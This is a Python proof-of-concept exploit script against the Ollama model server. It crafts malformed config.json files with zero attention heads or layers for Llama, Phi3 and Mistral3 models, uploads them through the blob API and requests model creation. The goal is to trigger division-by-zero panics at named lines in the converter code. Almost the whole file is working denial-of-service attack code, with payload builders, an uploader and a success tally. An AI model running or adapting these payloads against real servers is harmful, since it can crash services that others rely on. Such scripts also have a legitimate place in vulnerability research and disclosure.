#!/usr/bin/env python3
"""
Advanced Division by Zero PoC for Ollama
Target: Multiple unprotected division operations

High-risk Vulnerabilities:
1. convert_llama.go:87 - dim := p.HiddenSize / p.NumAttentionHeads (No protection!)
2. convert_phi3.go:50 - p.HiddenSize / cmp.Or(p.NumAttentionHeads, p.NHead)
3. convert_mistral.go:64 - p.TextModel.HiddenSize / p.TextModel.NumHiddenLayers

Attack Strategy: Bypass existing protections and target unprotected division-by-zero points.
"""

import json
import hashlib
import requests
import tempfile
import os
from pathlib import Path

# Ollama server configuration
OLLAMA_BASE_URL = "http://localhost:11434"

def create_llama_rope_scaling_attack():
    """
    Attacks the unprotected division by zero in convert_llama.go:87
    dim := p.HiddenSize / p.NumAttentionHeads
    
    This vulnerability is in the RopeScaling handling and has no protective conditions!
    """
    config = {
        "architectures": ["LlamaForCausalLM"],
        "hidden_size": 4096,              # 分子: 非零
        "num_attention_heads": 0,         # Denominator: zero -> triggers division by zero!
        "n_head": 32,                     # Non-zero, bypasses the if condition check
        "vocab_size": 32000,
        "max_position_embeddings": 2048,
        "model_type": "llama",
        "torch_dtype": "float16",
        "transformers_version": "4.21.0",
        # Key: Trigger the RopeScaling path
        "rope_scaling": {
            "rope_type": "llama3",        # Trigger specific code path
            "factor": 8.0,
            "low_freq_factor": 1.0,
            "high_freq_factor": 4.0,
            "original_max_position_embeddings": 8192
        }
    }
    return config, "llama-rope-scaling-attack"

def create_phi3_attack():
    """
    Attacks the division by zero vulnerability in convert_phi3.go:50
    kv["phi3.rope.dimension_count"] = p.HiddenSize / cmp.Or(p.NumAttentionHeads, p.NHead)
    """
    config = {
        "architectures": ["Phi3ForCausalLM"],  # Note: Using Phi3 architecture
        "hidden_size": 3072,
        "num_attention_heads": 0,         # Denominator 1: zero
        "n_head": 0,                      # Denominator 2: zero -> cmp.Or(0,0) = 0
        "vocab_size": 32064,
        "max_position_embeddings": 4096,
        "model_type": "phi3",
        "torch_dtype": "float16"
    }
    return config, "phi3-division-attack"

def create_mistral3_attack():
    """
    Attacks the division by zero vulnerability in convert_mistral.go:64
    kv["mistral3.rope.dimension_count"] = p.TextModel.HiddenSize / p.TextModel.NumHiddenLayers
    """
    config = {
        "architectures": ["Mistral3ForConditionalGeneration"],
        "text_config": {
            "hidden_size": 4096,          # 分子: 非零
            "num_hidden_layers": 0,       # Denominator: zero -> division by zero!
            "num_attention_heads": 32,
            "vocab_size": 32000,
            "max_position_embeddings": 32768,
            "rope_theta": 1000000.0,
            "rms_norm_eps": 1e-5,
            "head_dim": 128
        },
        "vision_config": {
            "hidden_size": 1024,
            "num_hidden_layers": 24,
            "num_attention_heads": 16,
            "image_size": 336,
            "patch_size": 14,
            "num_channels": 3,
            "rope_theta": 10000.0
        },
        "vocab_size": 32000,
        "model_type": "mistral3"
    }
    return config, "mistral3-layers-attack"

def create_tensor_reshape_attack():
    """
    Attacks the tensor reshape division by zero in convert_llama.go:194
    dims[0] / int(heads) / 2
    
    ❌ Note: This attack vector is unlikely to succeed because:
    1. The repack function is only called for specific tensors.
    2. The 'heads' value comes from num_attention_heads; setting it to 0 would fail earlier.
    3. Actual tensor data is required to trigger the repack function.
    """
    config = {
        "architectures": ["LlamaForCausalLM"],
        "hidden_size": 4096,
        "num_attention_heads": 0,         # 🎯 Set to 0 to attempt triggering division by zero
        "num_key_value_heads": 0,         # 🎯 Also set to 0
        "n_head": 0,
        "vocab_size": 32000,
        "max_position_embeddings": 2048,
        "model_type": "llama",
        "torch_dtype": "float16",
        # Note: Even with this setup, it's unlikely to trigger the repack division by zero
        # because it requires actual tensor data and the model conversion would fail earlier.
    }
    return config, "tensor-reshape-attack-v2"

def calculate_sha256(data):
    """Calculates the SHA256 digest of the data."""
    if isinstance(data, str):
        data = data.encode('utf-8')
    return hashlib.sha256(data).hexdigest()

def create_minimal_safetensors():
    import struct

    # SafeTensors format: [8-byte metadata length][JSON metadata][Tensor data]
    # Create a minimal tensor - a single float32 value
    tensor_data = struct.pack('<f', 1.0)  # A single float32 value: 1.0

    # Metadata describing this tensor
    metadata = {
        "embed_tokens.weight": {
            "dtype": "F32",
            "shape": [1, 1],
            "data_offsets": [0, 4]  # Data offsets for the tensor in the file
        }
    }
    
    metadata_json = json.dumps(metadata, separators=(',', ':'))
    metadata_bytes = metadata_json.encode('utf-8')
    
    # 8-byte header: metadata length
    header_length = len(metadata_bytes)
    header = struct.pack('<Q', header_length)  # little-endian uint64
    
    # Full file: header + metadata + tensor data
    return header + metadata_bytes + tensor_data

def create_supporting_files():
    """Creates supporting files."""
    files = {}
    
    # tokenizer.json
    tokenizer_config = {
        "version": "1.0",
        "truncation": None,
        "padding": None,
        "added_tokens": [],
        "normalizer": None,
        "pre_tokenizer": None,
        "post_processor": None,
        "decoder": None,
        "model": {"type": "BPE", "vocab": {}, "merges": []}
    }
    files["tokenizer.json"] = json.dumps(tokenizer_config)
    
    # tokenizer_config.json
    files["tokenizer_config.json"] = json.dumps({
        "tokenizer_class": "LlamaTokenizer",
        "model_max_length": 2048
    })
    
    # special_tokens_map.json
    files["special_tokens_map.json"] = json.dumps({
        "bos_token": "<s>", "eos_token": "</s>",
        "unk_token": "<unk>", "pad_token": "<pad>"
    })
    
    # generation_config.json
    files["generation_config.json"] = json.dumps({
        "bos_token_id": 1, "eos_token_id": 2,
        "pad_token_id": 0, "max_length": 2048
    })
    
    return files

def upload_blob(filename, data, digest):
    """Uploads a file as a blob."""
    url = f"{OLLAMA_BASE_URL}/api/blobs/sha256:{digest}"
    
    if isinstance(data, str):
        data = data.encode('utf-8')
    
    try:
        response = requests.post(url, data=data, timeout=30)
        return response.status_code == 201
    except:
        return False

def test_division_attack(config, model_name, attack_description):
    """Tests a specific division by zero attack."""
    print(f"\n🎯 Testing Attack: {attack_description}")
    print(f"📋 Target Model: {model_name}")
    
    # Create file data
    config_json = json.dumps(config, indent=2)
    safetensors_data = create_minimal_safetensors()
    supporting_files = create_supporting_files()
    
    # Print key configuration
    print(f"🔍 Key Configuration:")
    if 'architectures' in config:
        print(f"  Architecture: {config['architectures'][0]}")
    
    if 'hidden_size' in config:
        print(f"  hidden_size: {config['hidden_size']}")
    if 'num_attention_heads' in config:
        print(f"  num_attention_heads: {config['num_attention_heads']}")
    if 'n_head' in config:
        print(f"  n_head: {config['n_head']}")
    
    # Handle special configurations
    if 'rope_scaling' in config:
        print(f"  🎯 RopeScaling: {config['rope_scaling']['rope_type']}")
    if 'text_config' in config:
        print(f"  🎯 text_config.num_hidden_layers: {config['text_config']['num_hidden_layers']}")
    
    # Prepare file uploads
    file_data = {
        "config.json": config_json,
        "model.safetensors": safetensors_data,
        **supporting_files
    }
    
    # Calculate digests and upload
    file_digests = {}
    print(f"\n📤 Uploading files...")
    for filename, data in file_data.items():
        digest = calculate_sha256(data)
        file_digests[filename] = f"sha256:{digest}"
        
        if not upload_blob(filename, data, digest):
            print(f"❌ {filename} upload failed")
            return False
        else:
            print(f"✅ {filename}")
    
    # Send create request
    print(f"\n💥 Sending attack request...")
    url = f"{OLLAMA_BASE_URL}/api/create"
    payload = {"model": model_name, "files": file_digests, "stream": False}
    
    try:
        response = requests.post(url, json=payload, timeout=60)
        
        print(f"📡 Status Code: {response.status_code}")
        print(f"📄 Response: {response.text}")
        
        # Check if a panic or error was triggered
        response_text = response.text.lower()
        if any(keyword in response_text for keyword in ["panic", "division by zero", "runtime error", "fatal error"]):
            print("🎉 ✅ Division by zero vulnerability triggered successfully!")
            return True
        elif response.status_code != 200:
            print("⚠️ Request failed, an internal error may have been triggered")
            return False
        else:
            print("❌ Did not trigger the expected error")
            return False
            
    except Exception as e:
        print(f"❌ Request exception: {e}")
        return False

def run_comprehensive_attack():
    """Runs a comprehensive suite of division by zero attacks."""
    print("🚀 Advanced Division by Zero Exploit Suite")
    print("=" * 60)
    
    # Check server connection
    try:
        response = requests.get(f"{OLLAMA_BASE_URL}/api/tags", timeout=5)
        if response.status_code != 200:
            raise Exception("Server not available")
    except:
        print(f"❌ Could not connect to Ollama server: {OLLAMA_BASE_URL}")
        return
    
    print(f"✅ Ollama server connection successful")
    
    # List of attack vectors
    attacks = [
        create_llama_rope_scaling_attack(),  # Most dangerous unprotected division by zero
        create_phi3_attack(),                # Phi3 architecture division by zero
        create_mistral3_attack(),            # Mistral3 layers division by zero
        # create_tensor_reshape_attack(),      # Tensor res?hape division by zero
    ]
    
    attack_descriptions = [
        "LLaMA RopeScaling Unprotected Division by Zero (convert_llama.go:87)",
        "Phi3 RopeDimension Division by Zero (convert_phi3.go:50)", 
        "Mistral3 Layers Division by Zero (convert_mistral.go:64)",
        "Tensor Reshape Division by Zero (convert_llama.go:194)"
    ]
    
    successful_attacks = 0
    
    for i, (config, model_name) in enumerate(attacks):
        try:
            if test_division_attack(config, model_name, attack_descriptions[i]):
                successful_attacks += 1
        except Exception as e:
            print(f"❌ Attack execution exception: {e}")
        
        print("-" * 40)
    
    # Summary
    print("=" * 60)
    print(f"📊 Attack Results Summary:")
    print(f"  Total attacks: {len(attacks)}")
    print(f"  Successful attacks: {successful_attacks}")
    print(f"  Success rate: {successful_attacks/len(attacks)*100:.1f}%")
    
    if successful_attacks > 0:
        print("🚨 Exploitable division by zero vulnerability found!")
    else:
        print("ℹ️ All attacks were blocked by protection mechanisms")

if __name__ == "__main__":
    run_comprehensive_attack()
